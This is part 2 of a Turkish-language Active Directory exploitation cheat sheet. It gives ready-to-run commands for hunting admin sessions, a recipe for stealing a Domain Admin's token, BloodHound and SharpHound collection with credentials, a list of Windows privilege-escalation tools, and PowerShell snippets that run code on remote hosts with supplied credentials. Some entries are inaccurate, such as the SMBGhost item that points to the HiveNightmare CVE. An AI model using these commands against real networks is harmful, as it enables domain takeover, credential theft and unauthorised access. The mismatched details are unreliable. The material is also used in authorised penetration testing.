# Active Directory Exploitation Cheat Sheet - Bölüm 2

## Kullanıcı Avı

- **Makinede Yerel Admin Yetkisi Bulunan Kullanıcıları Listele:**  
  `Find-LocalAdminAccess -Verbose`

- **Domain'deki Yerel Adminleri Listele:**  
  `Find-DomainLocalGroupMember -Verbose`

- **Domain Admin veya Belirli Kullanıcının Oturumu Olan Bilgisayarları Bul:**  
  ```powershell
  Find-DomainUserLocation | Select-Object UserName, SessionFromName
  ```

- **Admin Yetkisini Doğrulama:**  
  `Test-AdminAccess`

### Kullanıcı Avı ile Domain Admin Yetkisi Alma:
1. Bir makinede yerel admin yetkisine sahipsiniz.  
2. Domain Admin bu makinede oturum açmış.  
3. Token'ını çalıp kendinizi taklit ediyorsunuz.  
4. **Sonuç:** Domain Admin yetkileri!

## AD Modülü Kullanımı

- **Mevcut Domain Bilgisi Al:**  
  `Get-ADDomain`

- **Diğer Domainleri Keşfet:**  
  `Get-ADDomain -Identity <Domain>`

- **Domain SID Bilgisi Al:**  
  `Get-DomainSID`

- **Domain Controller Bilgisi Al:**  
  ```powershell
  Get-ADDomainController
  Get-ADDomainController -Identity <DomainName>
  ```

- **Domain Kullanıcılarını Listele:**  
  ```powershell
  Get-ADUser -Filter * -Identity <user> -Properties *
  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
  ```

- **Domain Bilgisayarlarını Listele:**  
  ```powershell
  Get-ADComputer -Filter * -Properties *
  Get-ADGroup -Filter *
  ```

- **Domain Trust İlişkilerini Listele:**  
  ```powershell
  Get-ADTrust -Filter *
  Get-ADTrust -Identity <DomainName>
  ```

- **Forest Trust İlişkilerini Listele:**  
  ```powershell
  Get-ADForest
  Get-ADForest -Identity <ForestName>
  (Get-ADForest).Domains
  ```

- **Yerel AppLocker Politikasını Listele:**  
  ```powershell
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  ```

## BloodHound Kullanımı

### Uzak BloodHound

- **BloodHound Python Deposunu Kullanın veya Kurulum Yapın:**  
  `pip3 install bloodhound`

- **BloodHound Kullanımı:**  
  ```bash
  bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All
  ```

### Yerel BloodHound

- **Exe Ingestor Kullanımı:**  
  ```powershell
  .\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>
  ```

- **PowerShell Modülü Ingestor Kullanımı:**  
  ```powershell
  . .\SharpHound.ps1
  Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>
  ```

## Faydalı Keşif Araçları

- **ldapdomaindump:** LDAP üzerinden bilgi toplama.
- **adidnsdump:** Kimlik doğrulaması yapılmış kullanıcılar için entegre DNS bilgisi toplama.
- **ACLight:** Yetkili hesapları keşfetmek için gelişmiş bir araç.
- **ADRecon:** Detaylı Active Directory keşif aracı.

## Yerel Yetki Yükseltme

- **Windows Privilege Escalation CheatSheet:** Yerel yetki yükseltme yöntemleri.
- **Juicy Potato:** SeImpersonate veya SeAssignPrimaryToken yetkilerini kullanarak System taklidi yapma.  
  📷 Yalnızca Windows Server 2016 ve Windows 10'un 1803 yamasına kadar çalışır.
- **Lovely Potato:** Otomatik Juicy Potato.  
  📷 Yalnızca Windows Server 2016 ve Windows 10'un 1803 yamasına kadar çalışır.
- **PrintSpoofer:** PrinterBug kullanarak System taklidi yapma.  
  📷 Windows Server 2019 ve Windows 10 için uygundur.
- **RoguePotato:** Gelişmiş Juicy Potato.  
  📷 Windows Server 2019 ve Windows 10 için uygundur.
- **Token Yetkilerini Suistimal Etme.**
- **SMBGhost (CVE-2020-0796):**  
  PoC: CVE-2021-36934 (HiveNightmare/SeriousSAM)

### Faydalı Yerel Yetki Yükseltme Araçları

- **PowerUp:** Yanlış yapılandırmaları suistimal etme.
- **BeRoot:** Genel yetki yükseltme keşif aracı.
- **Privesc:** Genel yetki yükseltme keşif aracı.
- **FullPowers:** Bir hizmet hesabının yetkilerini geri yükleme.

## Lateral Movement

### PowerShell Remoting

- **Mevcut Makinede PowerShell Remoting'i Etkinleştirme:**  
  `Enable-PSRemoting`

- **Yeni PSSession Başlatma veya Oturum Açma:**  
  ```powershell
  $sess = New-PSSession -ComputerName <Name>
  Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
  ```

### PS Credentials ile Uzaktan Kod Çalıştırma

```powershell
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

### Bir PowerShell Modülünü İçeri Aktarma ve Fonksiyonlarını Uzaktan Çalıştırma

```powershell
Import-Module <ModulePath>
Invoke-Command -ComputerName <RemoteMachine> -ScriptBlock {<ModuleFunction>}
```
